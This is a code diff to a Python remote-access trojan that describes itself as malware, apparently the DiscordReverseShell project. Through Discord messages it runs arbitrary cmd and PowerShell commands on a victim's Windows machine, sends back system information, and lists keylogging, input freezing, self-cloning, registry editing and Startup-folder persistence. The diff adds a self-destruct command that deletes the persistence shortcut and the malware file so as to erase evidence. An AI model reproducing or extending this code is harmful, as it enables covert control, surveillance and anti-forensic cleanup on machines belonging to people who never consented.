@@ -104,7 +104,7 @@ def check_token(token):
 
 def check_internet():
     try:
-        response = requests.get('http://www.google.com', timeout=5)
+        response = requests.get("http://www.google.com", timeout=5)
         response.raise_for_status()
         return True
     except requests.RequestException:
@@ -138,7 +138,8 @@ commands = "\n".join([
     "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
     "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
     "!quit - Exit session without deleting all the data",
-    "!exit - Exit session and delete all data"
+    "!exit - Exit session and delete all data",
+    "!selfdestruct - Remove the malware from the victims machine along whit all 'evidence'"
 ])
 
 
@@ -269,22 +270,24 @@ def zip(path):
 
 @client.event
 async def on_ready():
-    guild = client.get_guild(int(GUILD_ID))
-    channel = await guild.create_text_channel(session_id)
-    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
-    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
-    
-    start()
-    with open("system.txt", "r") as f:
-        system_info = f.read()
-    if system_info == "":
-        system_info = "Failed to fetch system information!"
-    
-    embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
-    embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
-    await channel.send(embed=embed)
-    delete_files(["system.txt"])
-    #browsers(channel)
+    try:
+        guild = client.get_guild(int(GUILD_ID))
+        channel = await guild.create_text_channel(session_id)
+        embed = discord.Embed(title="New session created", description="", color=0xfafafa)
+        embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+        
+        start()
+        with open("system.txt", "r") as f:
+            system_info = f.read()
+        if system_info == "":
+            system_info = "Failed to fetch system information!"
+        
+        embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
+        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+        await channel.send(embed=embed)
+        delete_files(["system.txt"])
+        #browsers(channel)
+    except: sys.exit(0)
 
 
 @client.event
@@ -455,7 +458,7 @@ async def on_message(message):
     elif message.content.startswith("cmd "):
         command = message.content[4:]
         try:
-            output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+            output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8") #   , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
             error_output = output[1].decode("utf-8")
             normal_output = output[0].decode("utf-8")
         except:
@@ -498,7 +501,7 @@ async def on_message(message):
     elif message.content.startswith("pw "):
         command = message.content[3:]
         try:
-            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP).communicate()#[0].decode("utf-8") #  , creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
             error_output = output[1].decode("utf-8")
             normal_output = output[0].decode("utf-8")
         except:
@@ -652,6 +655,7 @@ async def on_message(message):
         
         await message.reply("Keylogger enabled!")
     
+
 #! FREEZE
     elif message.content.startswith("freeze "):
         action = message.content[7:]
@@ -672,6 +676,7 @@ async def on_message(message):
                 freezed = False
                 await message.reply("Inputs are unfrezzed!")
         
+
 #! CLONE
     elif message.content.startswith("clone "):
         path = message.content[6:]
@@ -707,6 +712,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
     
+
 #! REGEDIT
     elif message.content.startswith("regedit "):
         action = message.content[8:9]
@@ -789,6 +795,28 @@ async def on_message(message):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed)
 
+
+#SELF DESTRUCT
+    elif message.startswith("!selfdestruct"):
+        if message.content.startswith("!selfdestruct CONFIRM"):
+            #args = message.content[22:]
+            shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
+            if os.path.exists(shortcut_dir): delete_files([shortcut_dir])
+
+            embed = discord.Embed(title="Self destruct",  description="```Self destruction started!```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+
+            await client.close()
+            #cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{dir}' -Recurse -Force"
+            cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{sys.argv[0]}'"
+            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
+            sys.exit(0)
+        else:
+            embed = discord.Embed(title="Self destruct",  description="```Please use '!selfdestruct CONFIRM' to confirm this action!```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+
 #QUIT
     elif message.content == "!quit":
         await client.close()
@@ -816,4 +844,3 @@ else: Startup(sys.argv[0])
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
